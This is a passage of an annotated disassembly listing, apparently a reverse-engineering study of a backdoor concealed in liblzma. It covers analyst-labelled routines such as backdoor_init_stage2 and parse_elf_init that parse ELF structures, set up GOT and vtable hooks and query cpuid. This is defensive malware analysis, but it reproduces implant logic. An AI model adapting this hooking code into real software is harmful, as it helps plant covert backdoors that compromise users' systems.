.text.microlzma_encoder_inia:0000000000006BF3 loc_6BF3:                               ; CODE XREF: parse_elf_init+13AB↑j
.text.microlzma_encoder_inia:0000000000006BF3                                         ; parse_elf_init+16C2↓j ...
.text.microlzma_encoder_inia:0000000000006BF3                 mov     dword ptr [r12], 1
.text.microlzma_encoder_inia:0000000000006BFB
.text.microlzma_encoder_inia:0000000000006BFB loc_6BFB:                               ; CODE XREF: parse_elf_init+E26↑j
.text.microlzma_encoder_inia:0000000000006BFB                                         ; parse_elf_init+E38↑j ...
.text.microlzma_encoder_inia:0000000000006BFB                 mov     rdx, [rsp+0B58h+anonymous_7.elf_info_arr+20h]
.text.microlzma_encoder_inia:0000000000006C03                 mov     rax, [rsp+0B58h+var_B38]
.text.microlzma_encoder_inia:0000000000006C08                 cmp     [rsp+0B58h+var_B08], 0
.text.microlzma_encoder_inia:0000000000006C0E                 mov     [rax+10h], rdx
.text.microlzma_encoder_inia:0000000000006C12                 jz      short loc_6C2E
.text.microlzma_encoder_inia:0000000000006C14                 mov     rax, [rsp+0B58h+var_B08]
.text.microlzma_encoder_inia:0000000000006C19                 mov     rax, [rax+8]
.text.microlzma_encoder_inia:0000000000006C1D                 add     rax, [rdx]
.text.microlzma_encoder_inia:0000000000006C20                 inc     dword ptr [r13+3C0h]
.text.microlzma_encoder_inia:0000000000006C27                 mov     [r13+350h], rax
.text.microlzma_encoder_inia:0000000000006C2E
.text.microlzma_encoder_inia:0000000000006C2E loc_6C2E:                               ; CODE XREF: parse_elf_init+13F2↑j
.text.microlzma_encoder_inia:0000000000006C2E                 cmp     [rsp+0B58h+var_B00], 0
.text.microlzma_encoder_inia:0000000000006C34                 jz      short loc_6C50
.text.microlzma_encoder_inia:0000000000006C36                 mov     rax, [rsp+0B58h+var_B00]
.text.microlzma_encoder_inia:0000000000006C3B                 mov     rax, [rax+8]
.text.microlzma_encoder_inia:0000000000006C3F                 add     rax, [rdx]
.text.microlzma_encoder_inia:0000000000006C42                 inc     dword ptr [r13+3C0h]
.text.microlzma_encoder_inia:0000000000006C49                 mov     [r13+358h], rax
.text.microlzma_encoder_inia:0000000000006C50
.text.microlzma_encoder_inia:0000000000006C50 loc_6C50:                               ; CODE XREF: parse_elf_init+1414↑j
.text.microlzma_encoder_inia:0000000000006C50                 mov     rdi, [rsp+0B58h+var_B40]
.text.microlzma_encoder_inia:0000000000006C55                 call    sub_2880
.text.microlzma_encoder_inia:0000000000006C5A                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006C5C                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000006C62                 mov     rdi, [r13+318h]
.text.microlzma_encoder_inia:0000000000006C69                 mov     rsi, [rsp+0B58h+var_B38]
.text.microlzma_encoder_inia:0000000000006C6E                 call    lzma_free       ; PIC mode
.text.microlzma_encoder_inia:0000000000006C73                 cmp     dword ptr [r13+4A8h], 0Ch
.text.microlzma_encoder_inia:0000000000006C7B                 jnz     loc_5A52
.text.microlzma_encoder_inia:0000000000006C81                 mov     ecx, 18h
.text.microlzma_encoder_inia:0000000000006C86                 mov     edx, 7Fh
.text.microlzma_encoder_inia:0000000000006C8B                 mov     esi, 145h
.text.microlzma_encoder_inia:0000000000006C90                 mov     edi, 1
.text.microlzma_encoder_inia:0000000000006C95                 call    apply_one_entry_ex ; PIC mode
.text.microlzma_encoder_inia:0000000000006C9A                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006C9C                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000006CA2                 mov     rax, [r15+10h]
.text.microlzma_encoder_inia:0000000000006CA6                 mov     ecx, 12h
.text.microlzma_encoder_inia:0000000000006CAB                 mov     edx, 4
.text.microlzma_encoder_inia:0000000000006CB0                 mov     esi, 12Ah
.text.microlzma_encoder_inia:0000000000006CB5                 mov     rdi, [rax+40h]
.text.microlzma_encoder_inia:0000000000006CB9                 call    apply_one_entry_ex ; PIC mode
.text.microlzma_encoder_inia:0000000000006CBE                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006CC0                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000006CC6                 mov     rax, [r15+10h]
.text.microlzma_encoder_inia:0000000000006CCA                 mov     ecx, 20h ; ' '
.text.microlzma_encoder_inia:0000000000006CCF                 mov     edx, 4
.text.microlzma_encoder_inia:0000000000006CD4                 mov     esi, 13h
.text.microlzma_encoder_inia:0000000000006CD9                 mov     edi, 12Eh
.text.microlzma_encoder_inia:0000000000006CDE                 mov     r8, [rax+48h]
.text.microlzma_encoder_inia:0000000000006CE2                 call    apply_one_entry ; PIC mode
.text.microlzma_encoder_inia:0000000000006CE7                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006CE9                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000006CEF                 mov     rax, [r15+8]
.text.microlzma_encoder_inia:0000000000006CF3                 mov     ecx, 14h
.text.microlzma_encoder_inia:0000000000006CF8                 mov     edx, 6
.text.microlzma_encoder_inia:0000000000006CFD                 mov     esi, 132h
.text.microlzma_encoder_inia:0000000000006D02                 mov     rdi, [rax+8]
.text.microlzma_encoder_inia:0000000000006D06                 call    apply_one_entry_ex ; PIC mode
.text.microlzma_encoder_inia:0000000000006D0B                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006D0D                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000006D13                 mov     rax, [r15+10h]
.text.microlzma_encoder_inia:0000000000006D17                 mov     ecx, 10h
.text.microlzma_encoder_inia:0000000000006D1C                 mov     edx, 2
.text.microlzma_encoder_inia:0000000000006D21                 mov     esi, 15h
.text.microlzma_encoder_inia:0000000000006D26                 mov     edi, 138h
.text.microlzma_encoder_inia:0000000000006D2B                 mov     r8, [rax+50h]
.text.microlzma_encoder_inia:0000000000006D2F                 call    apply_one_entry ; PIC mode
.text.microlzma_encoder_inia:0000000000006D34                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006D36                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000006D3C                 mov     rax, [r15+10h]
.text.microlzma_encoder_inia:0000000000006D40                 mov     ecx, 20h ; ' '
.text.microlzma_encoder_inia:0000000000006D45                 mov     edx, 26h ; '&'
.text.microlzma_encoder_inia:0000000000006D4A                 mov     esi, 10h
.text.microlzma_encoder_inia:0000000000006D4F                 mov     edi, 0EEh
.text.microlzma_encoder_inia:0000000000006D54                 mov     r8, [rax+70h]
.text.microlzma_encoder_inia:0000000000006D58                 call    apply_one_entry ; PIC mode
.text.microlzma_encoder_inia:0000000000006D5D                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006D5F                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000006D65                 mov     rax, [r15+10h]
.text.microlzma_encoder_inia:0000000000006D69                 mov     ecx, 20h ; ' '
.text.microlzma_encoder_inia:0000000000006D6E                 mov     edx, 5
.text.microlzma_encoder_inia:0000000000006D73                 mov     esi, 17h
.text.microlzma_encoder_inia:0000000000006D78                 mov     edi, 140h
.text.microlzma_encoder_inia:0000000000006D7D                 mov     r8, [rax+78h]
.text.microlzma_encoder_inia:0000000000006D81                 call    apply_one_entry ; PIC mode
.text.microlzma_encoder_inia:0000000000006D86                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006D88                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000006D8E                 mov     rax, [r15+8]
.text.microlzma_encoder_inia:0000000000006D92                 mov     ecx, 20h ; ' '
.text.microlzma_encoder_inia:0000000000006D97                 mov     edx, 6
.text.microlzma_encoder_inia:0000000000006D9C                 mov     esi, 16h
.text.microlzma_encoder_inia:0000000000006DA1                 mov     edi, 13Ah
.text.microlzma_encoder_inia:0000000000006DA6                 mov     r8, [rax]
.text.microlzma_encoder_inia:0000000000006DA9                 call    apply_one_entry ; PIC mode
.text.microlzma_encoder_inia:0000000000006DAE                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006DB0                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000006DB6                 mov     rax, [rsp+0B58h+var_B30]
.text.microlzma_encoder_inia:0000000000006DBB                 mov     ecx, 10h
.text.microlzma_encoder_inia:0000000000006DC0                 mov     edx, 16h
.text.microlzma_encoder_inia:0000000000006DC5                 mov     esi, 11h
.text.microlzma_encoder_inia:0000000000006DCA                 mov     edi, 114h
.text.microlzma_encoder_inia:0000000000006DCF                 mov     r8, [rax+30h]
.text.microlzma_encoder_inia:0000000000006DD3                 call    apply_one_entry ; PIC mode
.text.microlzma_encoder_inia:0000000000006DD8                 test    eax, eax
.text.microlzma_encoder_inia:0000000000006DDA                 jz      loc_5A52
.text.microlzma_encoder_inia:0000000000006DE0                 cmp     dword ptr [r13+298h], 1C8h
.text.microlzma_encoder_inia:0000000000006DEB                 jnz     loc_5A52
.text.microlzma_encoder_inia:0000000000006DF1                 mov     rax, [r13+0F8h]
.text.microlzma_encoder_inia:0000000000006DF8                 mov     rdx, [rsp+0B58h+anonymous_7.ehdr]
.text.microlzma_encoder_inia:0000000000006E00                 lea     rsi, [rsp+0B58h+anonymous_6]
.text.microlzma_encoder_inia:0000000000006E08                 mov     [rax], r13
.text.microlzma_encoder_inia:0000000000006E0B                 mov     rax, [rsp+0B58h+var_AC8]
.text.microlzma_encoder_inia:0000000000006E13                 add     rax, 8
.text.microlzma_encoder_inia:0000000000006E17                 add     rdx, rax
.text.microlzma_encoder_inia:0000000000006E1A                 mov     ecx, [rdx]
.text.microlzma_encoder_inia:0000000000006E1C                 mov     [r13+50h], rdx
.text.microlzma_encoder_inia:0000000000006E20                 mov     [r13+58h], ecx
.text.microlzma_encoder_inia:0000000000006E24                 mov     dword ptr [rdx], 2
.text.microlzma_encoder_inia:0000000000006E2A                 mov     rdx, [r13+60h]
.text.microlzma_encoder_inia:0000000000006E2E                 mov     cl, [r13+68h]
.text.microlzma_encoder_inia:0000000000006E32                 or      [rdx], cl
.text.microlzma_encoder_inia:0000000000006E34                 add     rax, [rsp+0B58h+anonymous_7.field3]
.text.microlzma_encoder_inia:0000000000006E3C                 mov     ecx, 1Eh
.text.microlzma_encoder_inia:0000000000006E41                 mov     edx, [rax]
.text.microlzma_encoder_inia:0000000000006E43                 mov     [r13+40h], rax
.text.microlzma_encoder_inia:0000000000006E47                 mov     [r13+48h], edx
.text.microlzma_encoder_inia:0000000000006E4B                 lea     rdx, [r13+80h]
.text.microlzma_encoder_inia:0000000000006E52                 mov     dword ptr [rax], 1
.text.microlzma_encoder_inia:0000000000006E58                 mov     rdi, rdx
.text.microlzma_encoder_inia:0000000000006E5B                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000006E5D                 rep stosd
.text.microlzma_encoder_inia:0000000000006E5F                 mov     rax, [r15+10h]
.text.microlzma_encoder_inia:0000000000006E63                 mov     rax, [rax+40h]
.text.microlzma_encoder_inia:0000000000006E67                 mov     [r13+0A0h], rax
.text.microlzma_encoder_inia:0000000000006E6E                 mov     rax, [r13+70h]
.text.microlzma_encoder_inia:0000000000006E72                 mov     [rax], rdx
.text.microlzma_encoder_inia:0000000000006E75                 mov     rax, [r13+78h]
.text.microlzma_encoder_inia:0000000000006E79                 mov     rdx, [rsp+0B58h+glo_allocator]
.text.microlzma_encoder_inia:0000000000006E81                 mov     dword ptr [rax], 1
.text.microlzma_encoder_inia:0000000000006E87                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000006E89                 test    rdx, rdx
.text.microlzma_encoder_inia:0000000000006E8C
.text.microlzma_encoder_inia:0000000000006E8C loc_6E8C:                               ; CODE XREF: parse_elf_init+16A0↓j
.text.microlzma_encoder_inia:0000000000006E8C                 jnz     short loc_6EB3
.text.microlzma_encoder_inia:0000000000006E8E                 lea     rdx, [rsp+0B58h+anonymous_7]
.text.microlzma_encoder_inia:0000000000006E96                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000006E98                 mov     ecx, 256h
.text.microlzma_encoder_inia:0000000000006E9D                 mov     esi, 1
.text.microlzma_encoder_inia:0000000000006EA2                 mov     rdi, rdx
.text.microlzma_encoder_inia:0000000000006EA5                 rep stosd
.text.microlzma_encoder_inia:0000000000006EA7                 mov     rdi, [r15+80h]
.text.microlzma_encoder_inia:0000000000006EAE                 jmp     loc_5A90
.text.microlzma_encoder_inia:0000000000006EB3 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006EB3
.text.microlzma_encoder_inia:0000000000006EB3 loc_6EB3:                               ; CODE XREF: parse_elf_init:loc_6E8C↑j
.text.microlzma_encoder_inia:0000000000006EB3                 mov     cl, [rsi+rax]
.text.microlzma_encoder_inia:0000000000006EB6                 mov     [rdx+rax], cl
.text.microlzma_encoder_inia:0000000000006EB9                 inc     rax
.text.microlzma_encoder_inia:0000000000006EBC                 cmp     rax, 18h
.text.microlzma_encoder_inia:0000000000006EC0                 jmp     short loc_6E8C
.text.microlzma_encoder_inia:0000000000006EC2 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006EC2
.text.microlzma_encoder_inia:0000000000006EC2 loc_6EC2:                               ; CODE XREF: parse_elf_init+13CD↑j
.text.microlzma_encoder_inia:0000000000006EC2                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000006EC4                 mov     rsi, r14
.text.microlzma_encoder_inia:0000000000006EC7                 mov     rdi, rbx
.text.microlzma_encoder_inia:0000000000006ECA                 mov     dword ptr [rsp+0B58h+var_9D8], 4F0h
.text.microlzma_encoder_inia:0000000000006ED5                 call    _Llzip_decode_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000006EDA                 mov     [r12+20h], rax
.text.microlzma_encoder_inia:0000000000006EDF                 test    rax, rax
.text.microlzma_encoder_inia:0000000000006EE2                 jz      loc_6BF3
.text.microlzma_encoder_inia:0000000000006EE8                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000006EEA                 mov     rsi, r14
.text.microlzma_encoder_inia:0000000000006EED                 mov     rdi, rbx
.text.microlzma_encoder_inia:0000000000006EF0                 mov     dword ptr [rsp+0B58h+var_9D8], 1D8h
.text.microlzma_encoder_inia:0000000000006EFB                 call    _Llzip_decode_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000006F00                 mov     [r12+28h], rax
.text.microlzma_encoder_inia:0000000000006F05                 test    rax, rax
.text.microlzma_encoder_inia:0000000000006F08                 jz      loc_6BF3
.text.microlzma_encoder_inia:0000000000006F0E                 xor     edx, edx
.text.microlzma_encoder_inia:0000000000006F10                 mov     rsi, r14
.text.microlzma_encoder_inia:0000000000006F13                 mov     rdi, rbx
.text.microlzma_encoder_inia:0000000000006F16                 mov     dword ptr [rsp+0B58h+var_9D8], 0B10h
.text.microlzma_encoder_inia:0000000000006F21                 call    _Llzip_decode_0 ; PIC mode
.text.microlzma_encoder_inia:0000000000006F26                 mov     [r12+30h], rax
.text.microlzma_encoder_inia:0000000000006F2B                 test    rax, rax
.text.microlzma_encoder_inia:0000000000006F2E                 jnz     loc_6BFB
.text.microlzma_encoder_inia:0000000000006F34                 jmp     loc_6BF3
.text.microlzma_encoder_inia:0000000000006F39 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006F39
.text.microlzma_encoder_inia:0000000000006F39 loc_6F39:                               ; CODE XREF: parse_elf_init+F9F↑j
.text.microlzma_encoder_inia:0000000000006F39                                         ; parse_elf_init+FB5↑j
.text.microlzma_encoder_inia:0000000000006F39                 xor     r10d, r10d
.text.microlzma_encoder_inia:0000000000006F3C                 jmp     loc_67F8
.text.microlzma_encoder_inia:0000000000006F41 ; ---------------------------------------------------------------------------
.text.microlzma_encoder_inia:0000000000006F41
.text.microlzma_encoder_inia:0000000000006F41 loc_6F41:                               ; CODE XREF: parse_elf_init+294↑j
.text.microlzma_encoder_inia:0000000000006F41                                         ; parse_elf_init+2AD↑j
.text.microlzma_encoder_inia:0000000000006F41                 add     rsp, 0B30h
.text.microlzma_encoder_inia:0000000000006F48                 xor     eax, eax
.text.microlzma_encoder_inia:0000000000006F4A                 pop     rbx
.text.microlzma_encoder_inia:0000000000006F4B                 pop     r12
.text.microlzma_encoder_inia:0000000000006F4D                 pop     r13
.text.microlzma_encoder_inia:0000000000006F4F                 pop     r14
.text.microlzma_encoder_inia:0000000000006F51                 pop     r15
.text.microlzma_encoder_inia:0000000000006F53                 retn
.text.microlzma_encoder_inia:0000000000006F53 parse_elf_init  endp
.text.microlzma_encoder_inia:0000000000006F53
.text.microlzma_encoder_inia:0000000000006F53 _text_microlzma_encoder_inia ends
.text.microlzma_encoder_inia:0000000000006F53
.text.lzma_validate_chaia:0000000000006F60 ; ===========================================================================
.text.lzma_validate_chaia:0000000000006F60
.text.lzma_validate_chaia:0000000000006F60 ; Segment type: Pure code
.text.lzma_validate_chaia:0000000000006F60 ; Segment permissions: Read/Execute
.text.lzma_validate_chaia:0000000000006F60 _text_lzma_validate_chaia segment para public 'CODE' use64
.text.lzma_validate_chaia:0000000000006F60                 assume cs:_text_lzma_validate_chaia
.text.lzma_validate_chaia:0000000000006F60                 ;org 6F60h
.text.lzma_validate_chaia:0000000000006F60                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_validate_chaia:0000000000006F60
.text.lzma_validate_chaia:0000000000006F60 ; =============== S U B R O U T I N E =======================================
.text.lzma_validate_chaia:0000000000006F60
.text.lzma_validate_chaia:0000000000006F60
.text.lzma_validate_chaia:0000000000006F60 ; __int64 __fastcall backdoor_init_stage2(rootkit_ctx *ctx, _QWORD *unused, _QWORD *cpuid_got_ptr, struc_gots *gots)
.text.lzma_validate_chaia:0000000000006F60                 public backdoor_init_stage2
.text.lzma_validate_chaia:0000000000006F60 backdoor_init_stage2 proc near          ; DATA XREF: sub_2880+23↑o
.text.lzma_validate_chaia:0000000000006F60                                         ; .rodata.lzma12_mf_mao.0:000000000000CAC0↓o
.text.lzma_validate_chaia:0000000000006F60
.text.lzma_validate_chaia:0000000000006F60 var_140         = qword ptr -140h
.text.lzma_validate_chaia:0000000000006F60 var_138         = qword ptr -138h
.text.lzma_validate_chaia:0000000000006F60 var_130         = qword ptr -130h
.text.lzma_validate_chaia:0000000000006F60 vtbl            = struc_vtbl ptr -128h
.text.lzma_validate_chaia:0000000000006F60 init2           = struc_init22 ptr -0A0h
.text.lzma_validate_chaia:0000000000006F60
.text.lzma_validate_chaia:0000000000006F60                 endbr64
.text.lzma_validate_chaia:0000000000006F64                 push    r12
.text.lzma_validate_chaia:0000000000006F66                 xor     eax, eax
.text.lzma_validate_chaia:0000000000006F68                 mov     r12, rdi
.text.lzma_validate_chaia:0000000000006F6B                 mov     ecx, 22h ; '"'
.text.lzma_validate_chaia:0000000000006F70                 push    rbx
.text.lzma_validate_chaia:0000000000006F71                 xor     esi, esi
.text.lzma_validate_chaia:0000000000006F73                 sub     rsp, 138h
.text.lzma_validate_chaia:0000000000006F7A                 lea     rdi, [rsp+148h+vtbl]
.text.lzma_validate_chaia:0000000000006F7F                 rep stosd
.text.lzma_validate_chaia:0000000000006F81                 lea     rdi, [rsp+148h+init2]
.text.lzma_validate_chaia:0000000000006F89                 mov     ecx, 22h ; '"'
.text.lzma_validate_chaia:0000000000006F8E                 rep stosd
.text.lzma_validate_chaia:0000000000006F90                 mov     rax, offset _Llzma_code_part_1
.text.lzma_validate_chaia:0000000000006F97                 lea     rdi, [rsp+148h+init2.field_18]
.text.lzma_validate_chaia:0000000000006F9F                 mov     [rsp+148h+var_140], rax
.text.lzma_validate_chaia:0000000000006FA4                 mov     rax, offset _Llzma_index_memusage_part_0
.text.lzma_validate_chaia:0000000000006FAB                 mov     [rsp+148h+var_138], rax
.text.lzma_validate_chaia:0000000000006FB0                 mov     rax, offset global_ctx
.text.lzma_validate_chaia:0000000000006FB7                 mov     [rsp+148h+var_130], rax
.text.lzma_validate_chaia:0000000000006FBC                 call    lzma_check_init ; PIC mode
.text.lzma_validate_chaia:0000000000006FC1                 lea     rdx, [rsp+148h+vtbl]
.text.lzma_validate_chaia:0000000000006FC6                 lea     rcx, [rsp+148h+var_140]
.text.lzma_validate_chaia:0000000000006FCB                 mov     rdi, rdx
.text.lzma_validate_chaia:0000000000006FCE                 call    backdoor_vtbl_init ; PIC mode
.text.lzma_validate_chaia:0000000000006FD3
.text.lzma_validate_chaia:0000000000006FD3 loc_6FD3:                               ; CODE XREF: backdoor_init_stage2+87↓j
.text.lzma_validate_chaia:0000000000006FD3                 test    eax, eax
.text.lzma_validate_chaia:0000000000006FD5                 jz      short loc_702E
.text.lzma_validate_chaia:0000000000006FD7                 mov     rdi, rdx
.text.lzma_validate_chaia:0000000000006FDA                 mov     [rsp+148h+vtbl.static_gots], rcx
.text.lzma_validate_chaia:0000000000006FDF                 call    backdoor_vtbl_init ; PIC mode
.text.lzma_validate_chaia:0000000000006FE4                 cmp     eax, 5
.text.lzma_validate_chaia:0000000000006FE7                 jnz     short loc_6FD3
.text.lzma_validate_chaia:0000000000006FE9                 xor     eax, eax
.text.lzma_validate_chaia:0000000000006FEB                 mov     qword ptr [r12], 1
.text.lzma_validate_chaia:0000000000006FF3                 mov     [r12+8], rax
.text.lzma_validate_chaia:0000000000006FF8                 mov     [r12+10h], rax
.text.lzma_validate_chaia:0000000000006FFD                 mov     [r12+18h], rax
.text.lzma_validate_chaia:0000000000007002                 mov     [r12+20h], rax
.text.lzma_validate_chaia:0000000000007007                 xor     eax, eax
.text.lzma_validate_chaia:0000000000007009                 cpuid
.text.lzma_validate_chaia:000000000000700B                 test    eax, eax
.text.lzma_validate_chaia:000000000000700D                 jz      short loc_702A
.text.lzma_validate_chaia:000000000000700F                 mov     eax, 1
.text.lzma_validate_chaia:0000000000007014                 cpuid
.text.lzma_validate_chaia:0000000000007016                 mov     [r12+8], eax
.text.lzma_validate_chaia:000000000000701B                 mov     [r12+10h], ebx
.text.lzma_validate_chaia:0000000000007020                 mov     [r12+18h], ecx
.text.lzma_validate_chaia:0000000000007025                 mov     [r12+20h], edx
.text.lzma_validate_chaia:000000000000702A
.text.lzma_validate_chaia:000000000000702A loc_702A:                               ; CODE XREF: backdoor_init_stage2+AD↑j
.text.lzma_validate_chaia:000000000000702A                 xor     eax, eax
.text.lzma_validate_chaia:000000000000702C                 jmp     short loc_7053
.text.lzma_validate_chaia:000000000000702E ; ---------------------------------------------------------------------------
.text.lzma_validate_chaia:000000000000702E
.text.lzma_validate_chaia:000000000000702E loc_702E:                               ; CODE XREF: backdoor_init_stage2+75↑j
.text.lzma_validate_chaia:000000000000702E                 lea     rdi, [rsp+148h+init2]
.text.lzma_validate_chaia:0000000000007036                 mov     [rsp+148h+init2.cpuid_got_ptr], rdx
.text.lzma_validate_chaia:000000000000703E                 mov     [rsp+148h+init2.static_gots], rcx
.text.lzma_validate_chaia:0000000000007046                 mov     [rsp+148h+init2.rookit_ctx], r12
.text.lzma_validate_chaia:000000000000704E                 call    parse_elf_init  ; PIC mode
.text.lzma_validate_chaia:0000000000007053
.text.lzma_validate_chaia:0000000000007053 loc_7053:                               ; CODE XREF: backdoor_init_stage2+CC↑j
.text.lzma_validate_chaia:0000000000007053                 add     rsp, 138h
.text.lzma_validate_chaia:000000000000705A                 pop     rbx
.text.lzma_validate_chaia:000000000000705B                 pop     r12
.text.lzma_validate_chaia:000000000000705D                 retn
.text.lzma_validate_chaia:000000000000705D backdoor_init_stage2 endp
.text.lzma_validate_chaia:000000000000705D
.text.lzma_validate_chaia:000000000000705D _text_lzma_validate_chaia ends
.text.lzma_validate_chaia:000000000000705D
.text.parse_optiona:0000000000007060 ; ===========================================================================
.text.parse_optiona:0000000000007060
.text.parse_optiona:0000000000007060 ; Segment type: Pure code
.text.parse_optiona:0000000000007060 ; Segment permissions: Read/Execute
.text.parse_optiona:0000000000007060 _text_parse_optiona segment para public 'CODE' use64
.text.parse_optiona:0000000000007060                 assume cs:_text_parse_optiona
.text.parse_optiona:0000000000007060                 ;org 7060h
.text.parse_optiona:0000000000007060                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.parse_optiona:0000000000007060
.text.parse_optiona:0000000000007060 ; =============== S U B R O U T I N E =======================================
.text.parse_optiona:0000000000007060
.text.parse_optiona:0000000000007060
.text.parse_optiona:0000000000007060 ; __int64 __fastcall strlen(char *a1)
.text.parse_optiona:0000000000007060 strlen          proc near               ; CODE XREF: _Llzma12_mode_map_part_1+A2↓p
.text.parse_optiona:0000000000007060                 cmp     byte ptr [rdi], 0
.text.parse_optiona:0000000000007063                 jz      short loc_7075
.text.parse_optiona:0000000000007065                 mov     eax, 0
.text.parse_optiona:000000000000706A
.text.parse_optiona:000000000000706A loc_706A:                               ; CODE XREF: strlen+12↓j
.text.parse_optiona:000000000000706A                 add     rax, 1
.text.parse_optiona:000000000000706E                 cmp     byte ptr [rdi+rax], 0
.text.parse_optiona:0000000000007072                 jnz     short loc_706A
.text.parse_optiona:0000000000007074                 retn
.text.parse_optiona:0000000000007075 ; ---------------------------------------------------------------------------
.text.parse_optiona:0000000000007075
.text.parse_optiona:0000000000007075 loc_7075:                               ; CODE XREF: strlen+3↑j
.text.parse_optiona:0000000000007075                 mov     eax, 0
.text.parse_optiona:000000000000707A                 retn
.text.parse_optiona:000000000000707A strlen          endp
.text.parse_optiona:000000000000707A
.text.parse_optiona:000000000000707A ; ---------------------------------------------------------------------------
.text.parse_optiona:000000000000707B                 align 20h
.text.parse_optiona:0000000000007080
.text.parse_optiona:0000000000007080 ; =============== S U B R O U T I N E =======================================
.text.parse_optiona:0000000000007080
.text.parse_optiona:0000000000007080
.text.parse_optiona:0000000000007080 ; __int64 __fastcall sub_7080(char *a1, __int64 a2)
.text.parse_optiona:0000000000007080 sub_7080        proc near               ; CODE XREF: _Lworker_start_0+E5↓p
.text.parse_optiona:0000000000007080                 mov     rax, rsi
.text.parse_optiona:0000000000007083                 mov     edx, 0
.text.parse_optiona:0000000000007088                 test    rsi, rsi
.text.parse_optiona:000000000000708B                 jnz     short loc_7098
.text.parse_optiona:000000000000708D                 jmp     short locret_70A2
.text.parse_optiona:000000000000708F ; ---------------------------------------------------------------------------
.text.parse_optiona:000000000000708F
.text.parse_optiona:000000000000708F loc_708F:                               ; CODE XREF: sub_7080+1C↓j
.text.parse_optiona:000000000000708F                 add     rdx, 1
.text.parse_optiona:0000000000007093                 cmp     rax, rdx
.text.parse_optiona:0000000000007096                 jz      short locret_70A1
.text.parse_optiona:0000000000007098
.text.parse_optiona:0000000000007098 loc_7098:                               ; CODE XREF: sub_7080+B↑j
.text.parse_optiona:0000000000007098                 cmp     byte ptr [rdi+rdx], 0
.text.parse_optiona:000000000000709C                 jnz     short loc_708F
.text.parse_optiona:000000000000709E                 mov     rax, rdx
.text.parse_optiona:00000000000070A1
.text.parse_optiona:00000000000070A1 locret_70A1:                            ; CODE XREF: sub_7080+16↑j
.text.parse_optiona:00000000000070A1                 retn
.text.parse_optiona:00000000000070A2 ; ---------------------------------------------------------------------------
.text.parse_optiona:00000000000070A2
.text.parse_optiona:00000000000070A2 locret_70A2:                            ; CODE XREF: sub_7080+D↑j
.text.parse_optiona:00000000000070A2                 retn
.text.parse_optiona:00000000000070A2 sub_7080        endp
.text.parse_optiona:00000000000070A2
.text.parse_optiona:00000000000070A2 _text_parse_optiona ends
.text.parse_optiona:00000000000070A2
.text.auto_decoder_inia:00000000000070B0 ; ===========================================================================
.text.auto_decoder_inia:00000000000070B0
.text.auto_decoder_inia:00000000000070B0 ; Segment type: Pure code
.text.auto_decoder_inia:00000000000070B0 ; Segment permissions: Read/Execute
.text.auto_decoder_inia:00000000000070B0 _text_auto_decoder_inia segment para public 'CODE' use64
.text.auto_decoder_inia:00000000000070B0                 assume cs:_text_auto_decoder_inia
.text.auto_decoder_inia:00000000000070B0                 ;org 70B0h
.text.auto_decoder_inia:00000000000070B0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.auto_decoder_inia:00000000000070B0
.text.auto_decoder_inia:00000000000070B0 ; =============== S U B R O U T I N E =======================================
.text.auto_decoder_inia:00000000000070B0
.text.auto_decoder_inia:00000000000070B0
.text.auto_decoder_inia:00000000000070B0 ; __int64 __fastcall sub_70B0(int, __int64, __int64, __int64)
.text.auto_decoder_inia:00000000000070B0 sub_70B0        proc near               ; CODE XREF: installed_func_0+72B↓p
.text.auto_decoder_inia:00000000000070B0                                         ; check_special_rsa_key+9CE↓p ...
.text.auto_decoder_inia:00000000000070B0                 xor     eax, eax
.text.auto_decoder_inia:00000000000070B2                 test    rdx, rdx
.text.auto_decoder_inia:00000000000070B5                 jz      short locret_711C
.text.auto_decoder_inia:00000000000070B7                 push    r14
.text.auto_decoder_inia:00000000000070B9                 push    r13
.text.auto_decoder_inia:00000000000070BB                 mov     r13d, edi
.text.auto_decoder_inia:00000000000070BE                 push    r12
.text.auto_decoder_inia:00000000000070C0                 push    rbp
.text.auto_decoder_inia:00000000000070C1                 push    rbx
.text.auto_decoder_inia:00000000000070C2                 test    edi, edi
.text.auto_decoder_inia:00000000000070C4                 js      short loc_70CE
.text.auto_decoder_inia:00000000000070C6                 mov     rbx, rcx
.text.auto_decoder_inia:00000000000070C9                 test    rcx, rcx
.text.auto_decoder_inia:00000000000070CC                 jnz     short loc_70D4
.text.auto_decoder_inia:00000000000070CE
.text.auto_decoder_inia:00000000000070CE loc_70CE:                               ; CODE XREF: sub_70B0+14↑j
.text.auto_decoder_inia:00000000000070CE                                         ; sub_70B0+29↓j ...
.text.auto_decoder_inia:00000000000070CE                 or      rax, 0FFFFFFFFFFFFFFFFh
.text.auto_decoder_inia:00000000000070D2                 jmp     short loc_7113
.text.auto_decoder_inia:00000000000070D4 ; ---------------------------------------------------------------------------
.text.auto_decoder_inia:00000000000070D4
.text.auto_decoder_inia:00000000000070D4 loc_70D4:                               ; CODE XREF: sub_70B0+1C↑j
